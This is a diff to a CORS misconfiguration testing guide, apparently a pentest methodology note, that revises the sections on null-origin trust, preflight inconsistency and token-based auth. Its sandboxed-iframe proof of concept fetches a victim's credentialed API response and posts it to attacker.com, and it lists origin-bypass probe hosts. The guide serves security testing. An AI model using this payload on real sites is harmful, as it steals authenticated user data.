@@ -91,12 +91,21 @@ fetch('https://target.com/api/user', {credentials: 'include'})
 
 ### Null Origin Trust
 
-`Access-Control-Allow-Origin: null` matches requests from sandboxed iframes, `data:` URIs, and `file://` origins. Attackers deliver a sandboxed iframe payload to trigger the null origin read:
+`Access-Control-Allow-Origin: null` matches requests from sandboxed iframes, `data:` URIs, and `file://` origins. Attackers deliver a sandboxed iframe payload to trigger the null origin read.
+
+**Note:** `SameSite=Strict` and `SameSite=Lax` cookies are **not forwarded** from a sandboxed (null) origin context, so this vector works only when the target uses `SameSite=None` cookies or a non-cookie auth model (e.g., token stored in localStorage). Test this before assuming the PoC will carry a session.
+
+Use a direct `fetch` POST to exfiltrate rather than `top.location` — the latter is URL-length limited and requires the `allow-top-navigation-by-user-activation` sandbox flag:
 ```html
-<iframe sandbox="allow-scripts allow-top-navigation-by-user-activation"
-        srcdoc="<script>fetch('https://target.com/api',{credentials:'include'})
-                .then(r=>r.text()).then(d=>top.location='https://attacker.com/?d='+btoa(d))
-                </script>">
+<iframe sandbox="allow-scripts"
+        srcdoc="<script>
+          fetch('https://target.com/api', {credentials: 'include'})
+            .then(r => r.text())
+            .then(d => fetch('https://attacker.com/leak', {
+              method: 'POST',
+              body: d
+            }));
+        </script>">
 </iframe>
 ```
 
@@ -109,14 +118,16 @@ Origin allowlists implemented as suffix/prefix regex without anchoring the delim
 
 **Probe sequence:** systematically test `evil.target.com`, `target.com.evil.com`, `target.evil.com`, `target.com:8080`, `http://target.com`.
 
-### Pre-flight Not Enforced on Simple Requests
+### CORS Header Inconsistency Between Pre-flight and Actual Request
 
-Server validates `Origin` only on `OPTIONS` pre-flight, not on the actual request:
+Browsers enforce CORS on **both** the pre-flight OPTIONS and the actual method response. A 403 on OPTIONS does not protect the resource if the actual GET/POST response returns a permissive `ACAO` header — the browser checks `ACAO` on the final response regardless of the preflight outcome.
+
+The exploitable scenario is a **server-side inconsistency**: origin validation is applied only in the `OPTIONS` handler (or a middleware that fires only on preflight), while the actual method goes through a different code path that reflects the origin or returns a wildcard:
 ```
-OPTIONS /api → checks Origin, returns 403 if not allowed
-GET /api?with-cookie → ACAO header not checked, response returned
+OPTIONS /api  Origin: https://evil.com → 403  (validation present, blocks preflight)
+GET    /api   Origin: https://evil.com → Access-Control-Allow-Origin: https://evil.com  (validation absent)
 ```
-Any cross-origin GET (or POST with safe content-type) bypasses the protection.
+Because simple requests (GET, `application/x-www-form-urlencoded` POST) skip the preflight entirely, the inconsistency is directly exploitable: the browser permits the cross-origin script to read the response. **Test each HTTP method independently** — do not assume a correct OPTIONS response means the actual method is also protected.
 
 ### Wildcard with Credentials (Misconfigured Framework)
 
@@ -186,7 +197,7 @@ Internal services that trust `Origin: https://internal.corp` or `null` origins m
 
 1. Always test `ACAO` + `ACAC` together; neither is exploitable without the other (for cookie-based auth)
 2. After finding a reflected origin, confirm it works on the highest-privilege endpoint, not just `/health`
-3. For token-based auth (Authorization header), `ACAC: true` is irrelevant — `ACAO: *` is sufficient to expose token-carrying responses if the script supplies the token itself
+3. In a cold CORS attack the attacker does not hold the victim's bearer token, so token-based auth endpoints with `ACAO: *` (but no `ACAC`) are not directly exploitable cross-origin. The dangerous chain is XSS on a trusted origin — that script already runs in the right origin context, has access to tokens in storage, and can make credentialed requests and read the responses freely
 4. Subdomain XSS × trusted subdomain CORS is a critical chain — always cross-reference your CORS scope with your XSS findings
 5. Check `Vary: Origin` to confirm server is at least content-negotiating on origin; its absence may indicate static allowlist or full reflection
 6. Test error paths (404, 500) — misconfigured servers sometimes reflect origin only on error responses
